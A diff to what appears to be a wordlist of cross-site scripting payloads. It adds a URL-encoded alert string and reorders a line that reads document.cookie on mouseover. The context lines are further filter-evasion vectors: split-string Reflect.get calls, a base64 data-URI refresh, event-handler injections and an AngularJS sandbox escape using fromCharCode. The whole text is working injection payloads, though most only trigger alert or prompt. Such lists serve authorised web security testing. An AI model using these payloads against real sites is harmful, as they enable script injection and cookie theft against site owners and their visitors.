@@ -22,14 +22,15 @@ Reflect.get(frames,'ale'+'rt')(Reflect.get(frames,'docu'+'ment').domain)
 Reflect.get(window,'ale'+'rt')(Reflect.get(window,'docu'+'ment').domain)
 <img src=1 onerror=prompt(document.domain)>
 <input type="image" src="javascript:alert('XSS');">
-<IMG SRC=# onmouseover="alert(document.cookie)">  
 <input onfocus=alert(1) autofocus>
+%27%2b%61%6c%65%72%74%60%31%60%2b%27%3b
 <link rel="stylesheet" href="javascript:alert('XSS');">
 <table background="javascript:alert('XSS')">
 <div style="background-image: url(javascript:alert('XSS'))">
 <META HTTP-EQUIV="refresh" CONTENT="0;url=data:text/html;base64,PGltZyBzcmM9MSBvbmVycm9yPWFsZXJ0KDEpPgoKCg">
 injection%22%20style=%22animation-name:swoop-up%22%20onanimationstart=%22alert(document.domain)
 <img+src=1+onerror=prompt(document.domain)>
+<IMG SRC=# onmouseover="alert(document.cookie)">  
 <IMG SRC=javascript:alert('XSS')>
 "><svg><animatetransform%20onbegin=alert(1)>
 1&toString().constructor.prototype.charAt%3d[].join;[1]|orderBy:toString().constructor.fromCharCode(120,61,97,108,101,114,116,40,49,41)=1
